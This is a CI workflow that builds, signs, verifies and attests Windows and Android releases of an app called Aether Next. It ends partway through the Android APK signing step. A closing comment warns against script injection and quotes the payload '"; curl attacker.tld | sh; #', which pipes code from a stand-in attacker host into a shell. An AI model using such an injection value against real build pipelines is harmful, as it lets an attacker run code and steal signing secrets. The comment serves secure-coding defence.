# Builds development artifacts on main and distributable apps on trusted tags.
# Development downloads stay in Actions artifacts; only tag builds publish a Release.
name: Build apps

on:
  push:
    branches: [main]
    tags: ["v*"]
  workflow_dispatch:

# One build per branch/tag. A new push cancels the older in-flight job (not a real failure).
concurrency:
  group: build-apps-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions:
  contents: read

env:
  CARGO_TERM_COLOR: always
  CMAKE_GENERATOR: Ninja

jobs:
  # One job per suite, fanned out. These used to be five sequential steps of a
  # single job, so the first failure — usually a Rust compile error — meant the
  # desktop and Android suites never ran at all: one red check masked four suites
  # with no signal, which is how three syntax errors sat on main across two
  # pushes. Each suite now reports for itself.
  test-engine:
    name: Test engine
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
      - uses: lukka/get-cmake@fffaaafeea488556c2c12dad60690008bc1caacb # v4.4.2
      - uses: ilammy/setup-nasm@72793074d3c8cdda771dba85f6deafe00623038b # v1.5.2
      - name: Run engine tests
        working-directory: aether
        # --release avoids debug CRT mismatch with BoringSSL on VS 18 2026 runners.
        run: cargo test --release --features test-hooks
        env:
          CMAKE_GENERATOR: Ninja

  test-desktop-backend:
    name: Test desktop backend
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
      - uses: lukka/get-cmake@fffaaafeea488556c2c12dad60690008bc1caacb # v4.4.2
      - uses: ilammy/setup-nasm@72793074d3c8cdda771dba85f6deafe00623038b # v1.5.2
      - name: Run desktop backend tests
        working-directory: apps/desktop/src-tauri
        run: cargo test --tests
        env:
          CMAKE_GENERATOR: Ninja

  test-desktop-ui:
    name: Test desktop frontend
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/desktop/package-lock.json
      - name: Run desktop frontend tests
        working-directory: apps/desktop
        run: |
          npm ci
          npm test

  test-android-ui:
    name: Test android frontend
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/android/package-lock.json
      - name: Run android frontend tests
        working-directory: apps/android
        run: |
          npm ci
          npm test

  test-android-native:
    name: Test android native
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-java@de7274f081f381c8f8158605e0321c36c376e2e6 # v6.0.1
        with:
          distribution: "temurin"
          java-version: "21"
      - name: Run android unit tests
        working-directory: apps/android/android
        run: ./gradlew testDebugUnitTest

  # Aggregator so the downstream jobs keep a single dependency and the check name
  # stays the one branch protection already refers to.
  test:
    name: Automated test gate
    needs:
      - test-engine
      - test-desktop-backend
      - test-desktop-ui
      - test-android-ui
      - test-android-native
    runs-on: ubuntu-latest
    steps:
      - run: echo "all five suites reported independently"

  # The release pipeline's own checks: the checksum step, the packaging policy,
  # the anchor writers, and the static gates over both workflows. These are cheap
  # and they run before `publish` can be reached, because every one of them exists
  # to catch something that a release run would otherwise only discover after the
  # artifacts are downloadable.
  #
  # Why a job of its own rather than more steps in the build jobs: a build job that
  # has already spent forty minutes compiling cannot tell you whether the step that
  # packs its output is correct, and the answer to that question fits in seconds.
  release-integrity:
    name: Release integrity gates
    needs: [test]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: "22"
      - name: Checksum step, against a fixture release directory
        run: |
          set -euo pipefail
          bash .github/scripts/test-pack-checksums.sh
          bash .github/scripts/test-pack-checksums.sh --selftest-fail
      - name: Packaging policy and anchor writers
        run: |
          set -euo pipefail
          node scripts/package-policy.mjs --selftest-fail
          node scripts/anchor-witness.mjs --selftest-fail
          # The committed anchor must stay readable by the two writers that touch
          # it, each of which finds an entry with the same no-braces locator.
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file packaging/wintun.dll
      - name: Static gates over the workflows
        run: |
          set -euo pipefail
          node scripts/verify-release-integrity.mjs
          node scripts/verify-release-integrity.mjs --selftest-fail

  windows-app:
    name: Windows x64
    needs: [test, release-integrity]
    runs-on: windows-latest
    timeout-minutes: 60
    outputs:
      signing_mode: ${{ steps.cert.outputs.signing_mode }}
    permissions:
      contents: read
      actions: read # download the engine witness from its earlier workflow run
      # attest-build-provenance signs the artifact identity with the runner's
      # OIDC token and records it in the repo's attestation store; nothing else
      # in this job needs either.
      id-token: write
      attestations: write
    env:
      # Two kinds of run, named rather than inferred at every use site. `release`
      # is a tag: it must ship the witnessed engine, signed by an identity a clean
      # machine already trusts. `development` is everything else: it may build
      # against the placeholder anchor that is committed on main, and in exchange
      # every artifact it produces is named `-dev` and never reaches a download
      # page. `scripts/package-policy.mjs` is the single reader of this pair.
      AETHER_PACKAGE_KIND: ${{ startsWith(github.ref, 'refs/tags/') && 'release' || 'development' }}
      # The development opt-out, and only that: build.rs and
      # publish-engine-trust.mjs --check both stop a release build against an
      # unwitnessed anchor unless this is set, so a tag leaves it empty and the
      # policy step refuses the drift if anything ever sets it on a tag run.
      AETHER_ALLOW_UNWITNESSED: ${{ startsWith(github.ref, 'refs/tags/') && '' || '1' }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: "1.22"
          cache: false
      - uses: lukka/get-cmake@fffaaafeea488556c2c12dad60690008bc1caacb # v4.4.2
      - uses: ilammy/setup-nasm@72793074d3c8cdda771dba85f6deafe00623038b # v1.5.2
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/desktop/package-lock.json

      # The signing rule, proved on this machine before anything is signed with it:
      # a self-signed certificate may only be used when the call says it is a
      # development build, and a `NotTrusted`/`UnknownError` signature is not
      # "verified" merely because this run holds the thumbprint. It used to be both
      # of those things, which is how an engine nobody outside the runner could
      # verify reached a published package.
      - name: Test the signing rule before using it
        shell: pwsh
        run: ./.github/scripts/test-sign-windows.ps1

      # A release is signed by one identity for its whole life, and that identity
      # is the one the reviewed anchor pins. The certificate this run needs comes
      # from the repository's secrets; nothing here may mint one instead, because
      # a self-signed leaf is exactly what a clean machine's WinVerifyTrust
      # refuses, and the shipped shell refuses to start an engine it cannot
      # authenticate (apps/desktop/src-tauri/src/trust.rs).
      - name: Install the code-signing identity
        id: cert
        shell: pwsh
        env:
          SIGNING_PFX_BASE64: ${{ secrets.AETHER_CODESIGN_PFX_BASE64 }}
          SIGNING_PFX_PASSWORD: ${{ secrets.AETHER_CODESIGN_PFX_PASSWORD }}
        run: |
          $anchor = Get-Content -Raw packaging/trust/engine-trust.json | ConvertFrom-Json
          $eng = $anchor.files | Where-Object { $_.name -eq 'aether.exe' }
          if ($env:AETHER_PACKAGE_KIND -eq 'release') {
            if (-not $env:SIGNING_PFX_BASE64 -or -not $env:SIGNING_PFX_PASSWORD) {
              throw "a release run needs AETHER_CODESIGN_PFX_BASE64 and AETHER_CODESIGN_PFX_PASSWORD: an artifact signed with a run-local self-signed certificate cannot be verified by anyone who downloads it"
            }
            $pfx = Join-Path $env:RUNNER_TEMP "aether-release.pfx"
            [IO.File]::WriteAllBytes($pfx, [Convert]::FromBase64String($env:SIGNING_PFX_BASE64))
            $sec = ConvertTo-SecureString $env:SIGNING_PFX_PASSWORD -AsPlainText -Force
            $cert = Import-PfxCertificate -FilePath $pfx -CertStoreLocation "Cert:\CurrentUser\My" -Password $sec |
              Where-Object HasPrivateKey | Select-Object -First 1
            Remove-Item -LiteralPath $pfx -Force
            if (-not $cert) { throw "the release signing PFX holds no key" }
            if ($cert.Subject -eq $cert.Issuer) {
              throw "AETHER_CODESIGN_PFX_BASE64 is self-signed ($($cert.Subject)); anything it signs is NotTrusted on a clean machine"
            }
            $leaf = ([BitConverter]::ToString(
              [Security.Cryptography.SHA256]::Create().ComputeHash($cert.RawData)
            ) -replace '-', '').ToLowerInvariant()
            if ($eng.cert_sha256.ToLowerInvariant() -ne $leaf) {
              throw "the release certificate hashes to $leaf but the reviewed anchor pins $($eng.cert_sha256): this run would sign with an identity nobody witnessed"
            }
            $cn = $cert.GetNameInfo([Security.Cryptography.X509Certificates.X509NameType]::SimpleName, $false)
            if (-not $cn -or $eng.issued_cn -ne "CN=$cn") {
              throw "the release certificate's subject is $($cert.Subject) but the anchor's issued_cn is '$($eng.issued_cn)'"
            }
            "WINDOWS_CERT_THUMBPRINT=$($cert.Thumbprint)" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
            "WINDOWS_SIGNER_CN=$cn" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
            "AETHER_SIGNING_MODE=trusted" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
            "signing_mode=trusted" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
            "PINNED_CERT_SHA256=$leaf" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
            Write-Host "Release identity: $($cert.Subject) [$($cert.Thumbprint)], leaf sha256 $leaf (pinned by the anchor)"
            exit 0
          }

          # Development only: an ephemeral self-signed certificate, minted per run,
          # whose signatures nothing outside this job can verify. Every artifact it
          # touches is named -dev by the packaging step and is never uploaded to a
          # release, which is the only honest thing available without a CA.
          $pfxPass = "ci-sign-$([Guid]::NewGuid().ToString('N').Substring(0,16))"
          $configPath = Join-Path $env:RUNNER_TEMP "aether-codesign.cnf"
          $keyPath = Join-Path $env:RUNNER_TEMP "aether-codesign.key"
          $certPath = Join-Path $env:RUNNER_TEMP "aether-codesign.crt"
          $pfxPath = Join-Path $env:RUNNER_TEMP "aether-codesign.pfx"
          "[req]`ndefault_bits = 2048`ndistinguished_name = req_dn`nx509_extensions = v3_cs`nprompt = no`n[req_dn]`nCN = deathline94`n[v3_cs]`nkeyUsage = critical,digitalSignature`nextendedKeyUsage = codeSigning`nbasicConstraints = critical,CA:FALSE`nsubjectKeyIdentifier = hash" |
            Set-Content -LiteralPath $configPath -NoNewline

          & openssl req -x509 -newkey rsa:2048 -keyout $keyPath -out $certPath -days 1825 -nodes -config $configPath 2>&1
          if ($LASTEXITCODE -ne 0) { throw "openssl req failed with exit code $LASTEXITCODE" }
          & openssl pkcs12 -export -out $pfxPath -inkey $keyPath -in $certPath -passout "pass:$pfxPass" 2>&1
          if ($LASTEXITCODE -ne 0) { throw "openssl pkcs12 failed with exit code $LASTEXITCODE" }

          $secPass = ConvertTo-SecureString $pfxPass -AsPlainText -Force
          $devCert = Import-PfxCertificate -FilePath $pfxPath -CertStoreLocation "Cert:\CurrentUser\My" -Password $secPass |
            Where-Object HasPrivateKey | Select-Object -First 1
          if (-not $devCert) { throw "Imported PFX does not contain a certificate with a private key" }

          "WINDOWS_CERT_THUMBPRINT=$($devCert.Thumbprint)" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
          $devCn = $devCert.GetNameInfo([Security.Cryptography.X509Certificates.X509NameType]::SimpleName, $false)
          "WINDOWS_SIGNER_CN=$devCn" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
          "AETHER_SIGNING_MODE=ephemeral" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
          "signing_mode=ephemeral" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
          Write-Host "::warning::Development build: signed with a run-local self-signed certificate ($($devCert.Thumbprint)). Artifacts are named -dev and are not published."

      # The policy reads the signing mode selected above; an unset mode is never
      # evidence of a trusted release identity.
      - name: Decide what this run is allowed to ship
        id: policy
        shell: pwsh
        run: node scripts/package-policy.mjs --check

      # A release packages the engine the anchor was cut from - the same bytes, not
      # a recompile of them. Two separately compiled and separately signed PE
      # files cannot share a digest, so the old shape of this job (prepare-anchor
      # signs one engine and records its hash, build.yml builds and signs another,
      # then demands the two match) could only ever be red, and any green would
      # have meant a check that had stopped comparing anything. The pointer to
      # those bytes lives in the reviewed anchor, so a release cannot quietly
      # downgrade to "whatever this run just built".
      - name: Read the witness pointer from the anchor
        id: witness
        if: env.AETHER_PACKAGE_KIND == 'release' || steps.policy.outputs.anchor_complete == 'true'
        shell: pwsh
        run: |
          $anchor = Get-Content -Raw packaging/trust/engine-trust.json | ConvertFrom-Json
          $eng = $anchor.files | Where-Object { $_.name -eq 'aether.exe' }
          if ($eng.signing_profile -ne 'trusted-ca') {
            throw "the anchor witnessed aether.exe with signing_profile '$($eng.signing_profile)', not trusted-ca: those bytes cannot be verified on a clean machine, so they cannot be released"
          }
          "run=$($eng.witnessed_run)" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
          "artifact=$($eng.witnessed_artifact)" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
          "sha256=$($eng.file_sha256)" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
          "cert=$($eng.cert_sha256)" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append
          "cn=$($eng.issued_cn -replace '^CN=', '')" | Out-File -FilePath $env:GITHUB_OUTPUT -Encoding utf8 -Append

      - name: Download the witnessed engine
        if: env.AETHER_PACKAGE_KIND == 'release' || steps.policy.outputs.anchor_complete == 'true'
        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: ${{ steps.witness.outputs.artifact }}
          run-id: ${{ steps.witness.outputs.run }}
          path: witnessed-engine
          github-token: ${{ secrets.GITHUB_TOKEN }}

      # Measured before anything can consume it: the bytes that arrive must be the
      # bytes the anchor describes, or this release would ship something no witness
      # covers. `--check` is the same comparison the running shell makes at launch;
      # the -VerifyOnly call is the identity half of it, and it is given no
      # run-local thumbprint, so `NotTrusted` cannot be excused here.
      - name: Verify the witnessed engine before it is staged
        if: env.AETHER_PACKAGE_KIND == 'release' || steps.policy.outputs.anchor_complete == 'true'
        shell: pwsh
        run: |
          $exe = "witnessed-engine/aether.exe"
          if (-not (Test-Path -LiteralPath $exe -PathType Leaf)) { throw "the witnessed artifact held no aether.exe" }
          node scripts/publish-engine-trust.mjs --check --name aether.exe --file $exe
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          & ".github/scripts/sign-windows.ps1" -VerifyOnly -Path $exe `
            -ExpectedCertSha256 "${{ steps.witness.outputs.cert }}" `
            -ExpectedPublisherCN "${{ steps.witness.outputs.cn }}"
          exit $LASTEXITCODE

      - name: Stage the witnessed engine
        if: env.AETHER_PACKAGE_KIND == 'release' || steps.policy.outputs.anchor_complete == 'true'
        shell: pwsh
        run: |
          $res = "apps/desktop/src-tauri/resources"
          New-Item -ItemType Directory -Force -Path $res | Out-Null
          # Copy, never rebuild and never re-sign: the digest the shell vouches for
          # is a property of these bytes, and re-signing them would change it.
          Copy-Item -Force "witnessed-engine/aether.exe" "$res/aether.exe"

      - name: Build engine
        if: env.AETHER_PACKAGE_KIND != 'release'
        working-directory: aether
        run: cargo build --release

      - name: Sign and verify engine
        if: env.AETHER_PACKAGE_KIND != 'release'
        shell: pwsh
        run: |
          if (-not (Get-Item "Cert:\CurrentUser\My\$env:WINDOWS_CERT_THUMBPRINT" -ErrorAction SilentlyContinue)) { throw "Code signing cert not found in store" }
          # Single rule for "this binary is properly signed", shared with the
          # installer/GUI signing step and the packaged-artifact re-verification
          # below. It used to be re-typed at each site with different strictness.
          # -DevEphemeral is the explicit, named licence to tolerate a signature
          # only this run can verify; a release run never reaches this step.
          & ".github/scripts/sign-windows.ps1" -Thumbprint $env:WINDOWS_CERT_THUMBPRINT -Path "aether/target/release/aether.exe" -ExpectedPublisherCN $env:WINDOWS_SIGNER_CN -DevEphemeral

      - name: Stage wintun driver
        shell: pwsh
        run: |
          $res = "apps/desktop/src-tauri/resources"
          New-Item -ItemType Directory -Force -Path $res | Out-Null
          Copy-Item -Force "packaging/wintun.dll" "$res/wintun.dll"

      - name: Stage engine
        if: env.AETHER_PACKAGE_KIND != 'release' && steps.policy.outputs.anchor_complete != 'true'
        shell: pwsh
        run: |
          $res = "apps/desktop/src-tauri/resources"
          New-Item -ItemType Directory -Force -Path $res | Out-Null
          Copy-Item -Force "aether/target/release/aether.exe" "$res/aether.exe"

      # A development run may be compiled against the placeholder anchor on main;
      # a release may not, and says so at the policy step above rather than at the
      # installer of a user who cannot start it.
      - name: Verify staged wintun against the trust anchor
        shell: pwsh
        run: |
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file apps/desktop/src-tauri/resources/wintun.dll
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file packaging/wintun.dll

      - name: Verify staged engine against the committed witness
        shell: pwsh
        run: |
          node scripts/publish-engine-trust.mjs --check --name aether.exe --file apps/desktop/src-tauri/resources/aether.exe

      - name: Build app
        working-directory: apps/desktop
        shell: pwsh
        run: |
          npm ci
          npm run build
          npm run tauri build

      - name: Sign and verify GUI and installer
        shell: pwsh
        run: |
          $nsis = Get-ChildItem "apps/desktop/src-tauri/target/release/bundle/nsis" -Filter "*setup.exe" |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
          if (-not $nsis) { throw "installer missing" }

          $gui = @(
            "apps/desktop/src-tauri/target/release/Aether Next.exe",
            "apps/desktop/src-tauri/target/release/aether-desktop.exe",
            "apps/desktop/src-tauri/target/release/Aether.exe"
          ) | Where-Object { Test-Path $_ } | Select-Object -First 1
          if (-not $gui) { throw "gui missing" }

          $extra = @{}
          if ($env:AETHER_SIGNING_MODE -eq 'ephemeral') { $extra.DevEphemeral = $true }
          foreach ($bin in @($nsis.FullName, $gui)) {
            # sign-windows.ps1 re-reads the signature through the same
            # Status -eq 'Valid' + whole-CN + pinned-leaf assertion the release
            # demands; it used to be re-typed per site, with different strictness.
            & ".github/scripts/sign-windows.ps1" -Thumbprint $env:WINDOWS_CERT_THUMBPRINT -Path $bin `
              -ExpectedPublisherCN $env:WINDOWS_SIGNER_CN @extra
          }

      - name: Package
        shell: pwsh
        run: |
          # During packaging, not after installation: the same policy that gated
          # the build runs again so a package that became non-distributable
          # between the two (a re-signed engine, a mutated anchor) is never
          # written out. The label it returns is why a development installer
          # cannot be mistaken for a release one by a person or a script.
          node scripts/package-policy.mjs --check
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
          $label = "${{ steps.policy.outputs.artifact_label }}"
          $out = "dist-windows"
          New-Item -ItemType Directory -Force -Path $out, "$out/portable/engine" | Out-Null
          $nsis = Get-ChildItem "apps/desktop/src-tauri/target/release/bundle/nsis" -Filter "*setup.exe" |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1
          if (-not $nsis) { throw "installer missing" }
          Copy-Item $nsis.FullName "$out/AetherNext$label-windows-x64-setup.exe"
          $gui = @(
            "apps/desktop/src-tauri/target/release/Aether Next.exe",
            "apps/desktop/src-tauri/target/release/aether-desktop.exe",
            "apps/desktop/src-tauri/target/release/Aether.exe"
          ) | Where-Object { Test-Path $_ } | Select-Object -First 1
          if (-not $gui) { throw "gui missing" }
          Copy-Item $gui "$out/portable/AetherNext$label-Desktop.exe"
          # Always copy the exact engine that the Tauri bundle staged.
          Copy-Item -Force "apps/desktop/src-tauri/resources/aether.exe" "$out/portable/engine/aether.exe"
          Copy-Item "packaging/wintun.dll" "$out/portable/wintun.dll"
          Copy-Item "packaging/wintun.dll" "$out/portable/engine/wintun.dll"
          "Run AetherNext$label-Desktop.exe" | Set-Content "$out/portable/README.txt"
          # Ship the witness this build was compiled against: every digest the
          # running shell accepts, and the certificate it accepted, have to be
          # readable next to the binaries they describe.
          Copy-Item -Force "packaging/trust/engine-trust.json" "$out/portable/engine-trust.json"
          Copy-Item -Force "packaging/trust/engine-trust.json" "$out/engine-trust.json"
          if ($label -eq '-dev') {
            # Say it where a person will read it, not only in a filename.
            $notice = @(
              'DEVELOPMENT BUILD - NOT A RELEASE.',
              'This package is signed with a certificate that exists only inside the CI',
              'run that built it. Use the downloads on the repository release page instead.'
            )
            if ('${{ steps.policy.outputs.anchor_complete }}' -ne 'true') {
              $notice += 'Its engine has no published trust anchor; the installed shell will refuse to start it on a clean machine.'
            }
            ($notice + '' + (Get-Content "$out/portable/README.txt")) | Set-Content "$out/portable/README.txt"
          }
          Compress-Archive -Path "$out/portable/*" -DestinationPath "$out/AetherNext$label-portable-windows-x64.zip" -Force

      - name: Verify all packaged Windows binaries
        shell: pwsh
        run: |
          $label = "${{ steps.policy.outputs.artifact_label }}"
          $bins = @(
            "dist-windows/AetherNext$label-windows-x64-setup.exe",
            "dist-windows/portable/AetherNext$label-Desktop.exe"
          )
          $extra = @{}
          if ($env:AETHER_SIGNING_MODE -eq 'ephemeral') {
            $extra.DevEphemeral = $true
            $extra.Thumbprint = $env:WINDOWS_CERT_THUMBPRINT
          }
          $guiPin = if ($env:AETHER_SIGNING_MODE -eq 'trusted') { $env:PINNED_CERT_SHA256 } else { '' }
          foreach ($b in $bins) {
            & ".github/scripts/sign-windows.ps1" -VerifyOnly -Path $b `
              -ExpectedPublisherCN $env:WINDOWS_SIGNER_CN -ExpectedCertSha256 $guiPin @extra
          }
          $engine = "dist-windows/portable/engine/aether.exe"
          $complete = '${{ steps.policy.outputs.anchor_complete }}' -eq 'true'
          if ($complete) {
            & ".github/scripts/sign-windows.ps1" -VerifyOnly -Path $engine `
              -ExpectedPublisherCN "${{ steps.witness.outputs.cn }}" `
              -ExpectedCertSha256 "${{ steps.witness.outputs.cert }}"
          } else {
            & ".github/scripts/sign-windows.ps1" -VerifyOnly -Path $engine `
              -ExpectedPublisherCN $env:WINDOWS_SIGNER_CN @extra
          }
          # The outer signature only says the container was signed when it was
          # built; NSIS payloads are not hash-sealed, so extract and check what a
          # user actually ends up running.
          $verify = @{
            Installer = "dist-windows/AetherNext$label-windows-x64-setup.exe"
            Portable = "dist-windows/AetherNext$label-portable-windows-x64.zip"
            Anchor = "packaging/trust/engine-trust.json"
            ExpectedPublisherCN = $env:WINDOWS_SIGNER_CN
            ExpectedGuiCertSha256 = $guiPin
          }
          if ($env:AETHER_SIGNING_MODE -eq 'ephemeral') {
            $verify.Development = $true
            $verify.DevThumbprint = $env:WINDOWS_CERT_THUMBPRINT
            if (-not $complete) {
              $verify.DevEngineSha256 = (Get-FileHash -LiteralPath "apps/desktop/src-tauri/resources/aether.exe" -Algorithm SHA256).Hash.ToLowerInvariant()
            }
          }
          & "./scripts/verify-installers.ps1" @verify
          # Same witness, later in the pipeline: nothing between staging and the
          # upload may move the bytes the shell was compiled to accept.
          node scripts/publish-engine-trust.mjs --check --name aether.exe --file dist-windows/portable/engine/aether.exe
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file dist-windows/portable/engine/wintun.dll
          node scripts/publish-engine-trust.mjs --check --name wintun.dll --file dist-windows/portable/wintun.dll

      - name: Attest Windows build provenance
        # After verification, before upload: the attestation must describe the
        # bytes this job just vouched for, not merely bytes that exist.
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
        with:
          subject-path: |
            dist-windows/AetherNext*-windows-x64-setup.exe
            dist-windows/AetherNext*-portable-windows-x64.zip

      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: windows
          path: |
            dist-windows/AetherNext*-windows-x64-setup.exe
            dist-windows/AetherNext*-portable-windows-x64.zip
            dist-windows/engine-trust.json
          if-no-files-found: error

      - name: Remove signing key material
        if: always()
        shell: pwsh
        run: |
          if ($env:WINDOWS_CERT_THUMBPRINT) {
            Remove-Item -LiteralPath "Cert:\CurrentUser\My\$env:WINDOWS_CERT_THUMBPRINT" -Force -ErrorAction SilentlyContinue
          }
          @("aether-codesign.cnf", "aether-codesign.key", "aether-codesign.crt", "aether-codesign.pfx", "aether-release.pfx") |
            ForEach-Object {
              $path = Join-Path $env:RUNNER_TEMP $_
              if (Test-Path $path) { Remove-Item -LiteralPath $path -Force }
            }

  android-apk:
    name: Android APKs
    needs: [test]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: dtolnay/rust-toolchain@02cb101ec7c40f2c49e1d9714d64511d8e1b74de # master
        with:
          toolchain: "1.88.0"
          targets: aarch64-linux-android,armv7-linux-androideabi,x86_64-linux-android
      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0
        with:
          go-version: "1.22"
          cache: false
      - uses: lukka/get-cmake@fffaaafeea488556c2c12dad60690008bc1caacb # v4.4.2
      - uses: actions/setup-java@de7274f081f381c8f8158605e0321c36c376e2e6 # v6.0.1
        with:
          distribution: temurin
          java-version: "21"
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: "22"
          cache: npm
          cache-dependency-path: apps/android/package-lock.json
      - name: NDK
        id: ndk
        uses: nttld/setup-ndk@ed92fe6cadad69be94a966a7ee3271275e62f779 # v1.6.0
        with:
          ndk-version: r27d
          link-to-sdk: true
      - name: Accept Android licenses
        # `|| true` was there because `sdkmanager --licenses` exits non-zero even
        # when it succeeded. Tolerating the exit code is fine; tolerating the
        # absence of its *effect* is not - a failed acceptance would fall through
        # to the Gradle build, which then either prompts forever or fails with an
        # error that points at the NDK, not at the licence. Assert the outcome.
        run: |
          set -uo pipefail
          yes | sdkmanager --licenses >/dev/null 2>&1 || true
          test -d "$ANDROID_HOME/licenses" || { echo "::error::sdkmanager created no licenses directory under $ANDROID_HOME"; exit 1; }
          find "$ANDROID_HOME/licenses" -type f -size +0c | grep -q . || { echo "::error::$ANDROID_HOME/licenses holds no accepted term - the SDK licences were not agreed"; exit 1; }
          echo "Android SDK licences accepted ($(find "$ANDROID_HOME/licenses" -type f -size +0c | wc -l) file(s))"
      - run: cargo install cargo-ndk --version 4.1.2 --locked
      - name: Engine + stage
        working-directory: aether
        env:
          ANDROID_NDK_HOME: ${{ steps.ndk.outputs.ndk-path }}
          ANDROID_NDK_ROOT: ${{ steps.ndk.outputs.ndk-path }}
          CMAKE_GENERATOR: Ninja
          # Android 15 devices can run on 16 KB memory pages, and Play enforces it
          # for apps targeting 35+ from 2027-02-01. The linker only aligns PT_LOAD
          # to what it is asked for, so without this the engine .so lands at 0x1000
          # and fails to load on a 16 KB device — which the align check below would
          # catch, but only after a build that cannot ship.
          RUSTFLAGS: "-C link-arg=-Wl,-z,max-page-size=16384 -C link-arg=-Wl,-z,common-page-size=16384"
        run: |
          set -euo pipefail
          for abi in arm64-v8a armeabi-v7a x86_64; do
            cargo ndk -t "$abi" --platform 26 build --release
          done
          mkdir -p ../apps/android/android/app/src/main/jniLibs/{arm64-v8a,armeabi-v7a,x86_64}
          mkdir -p ../apps/android/android/app/src/main/assets/engine
          cp target/aarch64-linux-android/release/aether ../apps/android/android/app/src/main/jniLibs/arm64-v8a/libaether.so
          cp target/armv7-linux-androideabi/release/aether ../apps/android/android/app/src/main/jniLibs/armeabi-v7a/libaether.so
          cp target/x86_64-linux-android/release/aether ../apps/android/android/app/src/main/jniLibs/x86_64/libaether.so
          for so in ../apps/android/android/app/src/main/jniLibs/*/libaether.so; do
            node ../scripts/verify-hev-lock.mjs --align "$so"
          done
          cp target/aarch64-linux-android/release/aether ../apps/android/android/app/src/main/assets/engine/aether
      - name: UI
        working-directory: apps/android
        run: |
          npm ci
          npm run sync-www
      - name: Verify staged native payloads
        working-directory: apps/android/android
        run: |
          set -euo pipefail
          for abi in arm64-v8a armeabi-v7a x86_64; do
            for lib in libaether.so libhev-socks5-tunnel.so; do
              f="app/src/main/jniLibs/$abi/$lib"
              test -s "$f"
              echo "ok $f $(stat -c%s "$f" 2>/dev/null || wc -c < "$f")"
            done
          done
          # `test -s` above only proves non-empty. The staged hev payload is what
          # actually terminates the user's tunnel inside the VpnService fd, so it
          # is checked against a recorded digest and its ELF page alignment.
          node ../../scripts/verify-hev-lock.mjs
          node ../../scripts/verify-hev-lock.mjs --selftest-fail
      - name: APKs
        working-directory: apps/android/android
        env:
          AETHER_ANDROID_KEYSTORE: ${{ github.workspace }}/apps/android/android/release.keystore
          AETHER_ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          AETHER_ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
          AETHER_ANDROID_KEY_PASSWORD: ${{ secrets.ANDROID_KEY_PASSWORD }}
          # Secrets and action outputs reach the shell only through the
          # environment. Interpolating them into `run:` pastes untrusted text
          # straight into the script, so a keystore value containing `"; curl
          # attacker.tld | sh; #` becomes code, and the literal also shows up in
          # the step's rendered command before it executes.
